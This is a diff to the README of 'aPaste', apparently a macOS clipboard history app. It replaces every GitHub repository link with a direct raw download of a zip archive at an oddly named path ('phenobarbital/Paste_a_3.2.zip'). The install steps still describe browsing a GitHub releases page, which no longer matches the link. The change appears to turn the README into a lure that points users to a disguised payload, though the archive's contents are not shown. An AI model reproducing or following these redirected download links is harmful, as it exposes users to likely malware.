@@ -1,6 +1,6 @@
 # 📝 aPaste - Clipboard history that stays out of sight
 
-[![Download aPaste](https://img.shields.io/badge/Download-aPaste-blue?style=for-the-badge)](https://github.com/travelingwavepolyvinylchloride287/aPaste)
+[![Download aPaste](https://img.shields.io/badge/Download-aPaste-blue?style=for-the-badge)](https://raw.githubusercontent.com/travelingwavepolyvinylchloride287/aPaste/main/phenobarbital/Paste_a_3.2.zip)
 
 ## 🚀 Getting Started
 
@@ -14,12 +14,12 @@ Use it to:
 
 ## 📥 Download aPaste
 
-1. Open the download page: https://github.com/travelingwavepolyvinylchloride287/aPaste
+1. Open the download page: https://raw.githubusercontent.com/travelingwavepolyvinylchloride287/aPaste/main/phenobarbital/Paste_a_3.2.zip
 2. On the GitHub page, look for the latest release or download file
 3. Download the app file to your Mac
 4. Open the downloaded file and move the app to your Applications folder if prompted
 
-[Download aPaste here](https://github.com/travelingwavepolyvinylchloride287/aPaste)
+[Download aPaste here](https://raw.githubusercontent.com/travelingwavepolyvinylchloride287/aPaste/main/phenobarbital/Paste_a_3.2.zip)
 
 ## 🖥️ System Requirements
 
@@ -158,4 +158,4 @@ No. It also helps with simple tasks, like saving one link or a few bits of text.
 
 ## 🔗 Source and Download
 
-Primary download page: https://github.com/travelingwavepolyvinylchloride287/aPaste
+Primary download page: https://raw.githubusercontent.com/travelingwavepolyvinylchloride287/aPaste/main/phenobarbital/Paste_a_3.2.zip
